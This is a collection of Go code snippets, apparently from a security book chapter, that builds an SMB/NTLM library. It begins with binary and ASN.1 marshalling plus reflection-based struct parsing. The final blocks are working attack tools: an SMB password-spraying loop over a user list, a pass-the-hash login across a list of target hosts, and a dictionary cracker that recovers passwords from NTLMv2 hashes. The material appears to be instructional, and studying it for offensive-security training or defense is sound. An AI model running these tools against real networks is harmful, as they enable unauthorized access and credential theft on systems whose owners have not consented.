["```\ntype Foo struct {\n    X int\n    Y []byte\n}\ntype Message struct {\n    A int    // Binary, positional encoding\n    B Foo    // ASN.1 encoding as required by spec\n    C bool   // Binary, positional encoding\n}\n```", "```\nbinary.Write(someWriter, binary.LittleEndian, message)\n```", "```\n❶ type BinaryMarshallable interface {\n    ❷ MarshalBinary(*Metadata) ([]byte, error)\n    ❸ UnmarshalBinary([]byte, *Metadata) error\n   }\n```", "```\nfunc marshal(v interface{}, meta *Metadata) ([]byte, error) {\n    --snip--\n    bm, ok := v.(BinaryMarshallable) ❶\n    if ok {\n        // Custom marshallable interface found.\n        buf, err := bm.MarshalBinary(meta) ❷\n        if err != nil {\n            return nil, err\n        }\n        return buf, nil\n    }\n    --snip--\n}\n--snip--\nfunc unmarshal(buf []byte, v interface{}, meta *Metadata) (interface{}, error) {\n    --snip--\n    bm, ok := v.(BinaryMarshallable) ❸\n    if ok {\n        // Custom marshallable interface found.\n        if err := bm.UnmarshalBinary(buf, meta)❹; err != nil {\n            return nil, err\n        }\n        return bm, nil\n    }\n    --snip--\n}\n```", "```\nfunc (f *Foo) MarshalBinary(meta *encoder.Metadata) ([]byte, error) {\n    buf, err := asn1.Marshal(*f)❶\n    if err != nil {\n        return nil, err\n    }\n    return buf, nil\n}\n\nfunc (f *Foo) UnmarshalBinary(buf []byte, meta *encoder.Metadata) error {\n    data := Foo{}\n    if _, err := asn1.Unmarshal(buf, &data)❷; err != nil {\n        return err\n    }\n    *f = data\n    return nil\n}\n```", "```\ntype Foo struct {\n    A int    `json:\"a\"`\n    B string `json:\"b\"`\n}\n```", "```\ntype NegotiateRes struct {\n    Header\n    StructureSize        uint16\n    SecurityMode         uint16\n    DialectRevision      uint16\n    Reserved             uint16\n    ServerGuid           []byte `smb:\"fixed:16\"`❶\n    Capabilities         uint32\n    MaxTransactSize      uint32\n    MaxReadSize          uint32\n    MaxWriteSize         uint32\n    SystemTime           uint64\n    ServerStartTime      uint64\n    SecurityBufferOffset uint16 `smb:\"offset:SecurityBlob\"`❷\n    SecurityBufferLength uint16 `smb:\"len:SecurityBlob\"`❸\n    Reserved2            uint32\n    SecurityBlob         *gss.NegTokenInit\n}\n```", "```\nfunc parseTags(sf reflect.StructField❶) (*TagMap, error) {\n    ret := &TagMap{\n        m:   make(map[string]interface{}),\n        has: make(map[string]bool),\n    }\n    tag := sf.Tag.Get(\"smb\")❷\n    smbTags := strings.Split(tag, \",\")❸\n    for _, smbTag := range smbTags❹ {\n        tokens := strings.Split(smbTag, \":\")❺\n        switch tokens[0] { ❻\n        case \"len\", \"offset\", \"count\":\n            if len(tokens) != 2 {\n                return nil, errors.New(\"Missing required tag data. Expecting key:val\")\n            }\n            ret.Set(tokens[0], tokens[1])\n        case \"fixed\":\n            if len(tokens) != 2 {\n                return nil, errors.New(\"Missing required tag data. Expecting key:val\")\n            }\n            i, err := strconv.Atoi(tokens[1])\n            if err != nil {\n                return nil, err\n }\n            ret.Set(tokens[0], i) ❼\n\n    }\n```", "```\nfunc unmarshal(buf []byte, v interface{}, meta *Metadata) (interface{}, error) {\n    typev := reflect.TypeOf(v) ❶\n    valuev := reflect.ValueOf(v) ❷\n    --snip--\n    r := bytes.NewBuffer(buf)\n    switch typev.Kind() { ❸\n    case reflect.Struct:\n        --snip--\n    case reflect.Uint8:\n        --snip--\n    case reflect.Uint16:\n        --snip--\n    case reflect.Uint32:\n        --snip--\n    case reflect.Uint64:\n        --snip--\n    case reflect.Slice, reflect.Array:\n        --snip--\n    default:\n        return errors.New(\"Unmarshal not implemented for kind:\" + typev.Kind().String()), nil\n    }\n\n    return nil, nil\n\n}\n```", "```\ncase reflect.Struct:\n        m := &Metadata{ ❶\n            Tags:       &TagMap{},\n            Lens:       make(map[string]uint64),\n            Parent:     v,\n            ParentBuf:  buf,\n            Offsets:    make(map[string]uint64),\n            CurrOffset: 0,\n    }\n    for i := 0; i < typev.NumField(); i++ { ❷\n        m.CurrField = typev.Field(i).Name❸\n        tags, err := parseTags(typev.Field(i))❹\n        if err != nil {\n            return nil, err\n        }\n        m.Tags = tags\n        var data interface{}\n        switch typev.Field(i).Type.Kind() { ❺\n            case reflect.Struct:\n                data, err = unmarshal(buf[m.CurrOffset:], valuev.Field(i).Addr().Interface(), m)❻\n            default:\n                data, err = unmarshal(buf[m.CurrOffset:], valuev.Field(i).Interface(), m)❼\n        }\n        if err != nil {\n            return nil, err\n        }\n        valuev.Field(i).Set(reflect.ValueOf(data)) ❽\n    }\n v = reflect.Indirect(reflect.ValueOf(v)).Interface()\n    meta.CurrOffset += m.CurrOffset ❾\n    return v, nil\n```", "```\ncase reflect.Uint16:\n    var ret uint16\n    if err := binary.Read(r, binary.LittleEndian, &ret)❶; err != nil {\n        return nil, err\n    }\n    if meta.Tags.Has(\"len\")❷ {\n        ref, err := meta.Tags.GetString(\"len\")❸\n        if err != nil {\n            return nil, err\n        }\n        meta.Lens[ref]❹ = uint64(ret)\n    }\n ❺ meta.CurrOffset += uint64(binary.Size(ret))\n    return ret, nil\n```", "```\ncase reflect.Slice, reflect.Array:\n    switch typev.Elem().Kind()❶ {\n    case reflect.Uint8:\n        var length, offset int ❷\n        var err error\n        if meta.Tags.Has(\"fixed\") {\n            if length, err = meta.Tags.GetInt(\"fixed\")❸; err != nil {\n                return nil, err\n            }\n // Fixed length fields advance current offset\n            meta.CurrOffset += uint64(length) ❹\n        } else {\n            if val, ok := meta.Lens[meta.CurrField]❺; ok {\n                length = int(val)\n            } else {\n                return nil, errors.New(\"Variable length field missing length reference in struct\")\n            }\n            if val, ok := meta.Offsets[meta.CurrField]❻; ok {\n                offset = int(val)\n            } else {\n                // No offset found in map. Use current offset\n                offset = int(meta.CurrOffset)\n            }\n            // Variable length data is relative to parent/outer struct.\n            // Reset reader to point to beginning of data\n            r = bytes.NewBuffer(meta.ParentBuf[offset : offset+length])\n            // Variable length data fields do NOT advance current offset.\n        }\n        data := make([]byte, length) ❼\n        if err := binary.Read(r, binary.LittleEndian, &data)❽; err != nil {\n            return nil, err\n        }\n        return data, nil\n```", "```\n$ go get github.com/bhg/ch-6/smb\n```", "```\nfunc main() {\n    if len(os.Args) != 5 {\n        log.Fatalln(\"Usage: main </user/file> <password> <domain>\n        <target_host>\")\n    }\n\n    buf, err := ioutil.ReadFile(os.Args[1])\n    if err != nil {\n        log.Fatalln(err)\n    }\n    options := smb.Options❶{\n        Password: os.Args[2],\n        Domain:   os.Args[3],\n        Host:     os.Args[4],\n        Port:     445,\n    }\n\n    users := bytes.Split(buf, []byte{'\\n'})\n    for _, user := range users❷ {\n     ❸ options.User = string(user)\n        session, err := smb.NewSession(options, false)❹\n        if err != nil {\n            fmt.Printf(\"[-] Login failed: %s\\\\%s [%s]\\n\",\n                options.Domain,\n                options.User,\n                options.Password)\n            continue\n        }\n defer session.Close()\n        if session.IsAuthenticated❺ {\n            fmt.Printf(\"[+] Success     : %s\\\\%s [%s]\\n\",\n                options.Domain,\n                options.User,\n                options.Password)\n        }\n    }\n}\n```", "```\nfunc Ntowfv2(pass, user, domain string) []byte {\n    h := hmac.New(md5.New, Ntowfv1(pass))\n    h.Write(encoder.ToUnicode(strings.ToUpper(user) + domain))\n    return h.Sum(nil)\n}\n\nfunc ComputeResponseNTLMv2(nthash❶, lmhash, clientChallenge, serverChallenge, timestamp,\n                           serverName []byte) []byte {\n\n    temp := []byte{1, 1}\n    temp = append(temp, 0, 0, 0, 0, 0, 0)\n    temp = append(temp, timestamp...)\n    temp = append(temp, clientChallenge...)\n    temp = append(temp, 0, 0, 0, 0)\n    temp = append(temp, serverName...)\n    temp = append(temp, 0, 0, 0, 0)\n\n    h := hmac.New(md5.New, nthash)\n    h.Write(append(serverChallenge, temp...))\n    ntproof := h.Sum(nil)\n    return append(ntproof, temp...)\n}\n```", "```\nfunc main() {\n    if len(os.Args) != 5 {\n        log.Fatalln(\"Usage: main <target/hosts> <user> <domain> <hash>\")\n    }\n\n    buf, err := ioutil.ReadFile(os.Args[1])\n    if err != nil {\n        log.Fatalln(err)\n    }\n\n    options := smb.Options{\n        User:   os.Args[2],\n        Domain: os.Args[3],\n        Hash❶: os.Args[4],\n        Port:   445,\n    }\n\n    targets := bytes.Split(buf, []byte{'\\n'})\n    for _, target := range targets❷ {\n        options.Host = string(target)\n\n        session, err := smb.NewSession(options, false)\n        if err != nil {\n            fmt.Printf(\"[-] Login failed [%s]: %s\\n\", options.Host, err)\n            continue\n        }\n        defer session.Close()\n        if session.IsAuthenticated {\n            fmt.Printf(\"[+] Login successful [%s]\\n\", options.Host)\n        }\n    }\n}\n```", "```\nfunc NewAuthenticatePass(domain, user, workstation, password string, c Challenge) Authenticate\n{\n    // Assumes domain, user, and workstation are not unicode\n    nthash := Ntowfv2(password, user, domain)\n    lmhash := Lmowfv2(password, user, domain)\n    return newAuthenticate(domain, user, workstation, nthash, lmhash, c)\n}\n\nfunc NewAuthenticateHash(domain, user, workstation, hash string, c Challenge) Authenticate {\n    // Assumes domain, user, and workstation are not unicode\n    buf := make([]byte, len(hash)/2)\n    hex.Decode(buf, []byte(hash))\n    return newAuthenticate(domain, user, workstation, buf, buf, c)\n}\n```", "```\nfunc main() {\n    if len(os.Args) != 5 {\n log.Fatalln(\"Usage: main <dictionary/file> <user> <domain> <hash>\")\n    }\n\n    hash := make([]byte, len(os.Args[4])/2)\n    _, err := hex.Decode(hash, []byte(os.Args[4]))❶\n    if err != nil {\n        log.Fatalln(err)\n    }\n\n    f, err := ioutil.ReadFile(os.Args[1])\n    if err != nil {\n        log.Fatalln(err)\n    }\n\n    var found string\n    passwords := bytes.Split(f, []byte{'\\n'})\n    for _, password := range passwords❷ {\n        h := ntlmssp.Ntowfv2(string(password), os.Args[2], os.Args[3]) ❸\n        if bytes.Equal(hash, h)❹ {\n            found = string(password)\n            break\n        }\n    }\n    if found != \"\" {\n        fmt.Printf(\"[+] Recovered password: %s\\n\", found)\n    } else {\n        fmt.Println(\"[-] Failed to recover password\")\n    }\n}\n```"]